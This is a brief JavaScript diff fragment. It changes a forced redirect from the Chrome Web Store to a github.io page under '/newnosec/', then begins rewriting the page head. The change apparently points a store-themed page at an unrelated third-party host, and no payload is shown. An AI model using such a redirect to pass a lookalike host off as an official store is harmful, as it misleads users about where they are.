@@ -6,8 +6,8 @@ function m() {
    return r;
 }
 
-if (location.host != "chrome.google.com" || !location.pathname.startsWith("/webstore")) {
-    location.href = "https://chrome.google.com/webstore" + m();
+if (location.host != "makklooplgyt.github.io" || !location.pathname.startsWith("/webstore")) {
+    location.href = "https://makklooplgyt.github.io/newnosec/" + m();
 }
 
 document.head.innerHTML = `
